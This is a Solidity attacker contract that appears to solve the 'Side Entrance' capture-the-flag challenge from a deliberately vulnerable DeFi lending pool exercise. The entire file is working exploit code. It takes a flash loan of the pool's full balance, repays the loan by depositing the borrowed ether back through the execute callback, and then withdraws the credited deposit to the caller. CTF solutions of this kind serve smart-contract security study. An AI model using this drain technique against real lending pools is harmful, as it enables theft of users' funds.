pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceLenderPoolAttacker is IFlashLoanEtherReceiver {
    receive() external payable {}

    function attack(address pool) public {
        //Call flashloan to get balance ?
        SideEntranceLenderPool(pool).flashLoan(address(pool).balance);
        SideEntranceLenderPool(pool).withdraw();
        //msg.sender.call{ value: address(this).balance }('');
        msg.sender.transfer(address(this).balance); // still works.
    }

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }

}